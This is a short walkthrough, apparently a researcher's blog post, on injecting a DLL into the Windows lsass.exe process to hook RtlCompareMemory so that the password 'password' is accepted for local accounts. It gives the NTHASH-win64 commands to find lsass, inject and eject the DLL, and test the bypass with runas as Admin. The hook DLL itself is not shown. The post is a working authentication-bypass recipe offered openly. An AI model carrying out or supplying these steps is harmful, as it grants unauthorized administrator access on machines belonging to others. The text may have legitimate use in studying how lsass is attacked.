For fun and (no) profit : lets hook rtlcomparememory in lsass.exe.
Indeed, at some point, windows will need to compare a (md4) hash of your provided password with the hash of the password in the local sam database.
Definition of rtlcomparememory is here : https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcomparememory .
So lets hook rtlcomparememory, and if 'password' (or rather the md4 hash) is provided, then lets return "true".

Let's see how to achieve this.

Lets retrieve the pid of lsass : nthash-win64 /enumproc | findstr lsass

NTHASH-win64.exe /inject /pid:808 /binary:c:\temp\hook-win64.dll

optionally, check that our dll as been injected : NTHASH-win64.exe /enummod /pid:808 | findstr hook .

test runas /user:Admin cmd (provide "password" here as password when prompted) : you win!

NTHASH-win64.exe /eject /pid:808 /binary:hook-win64.dll

optionally, check that our dll as been ejected : NTHASH-win64.exe /enummod /pid:808 | findstr hook .
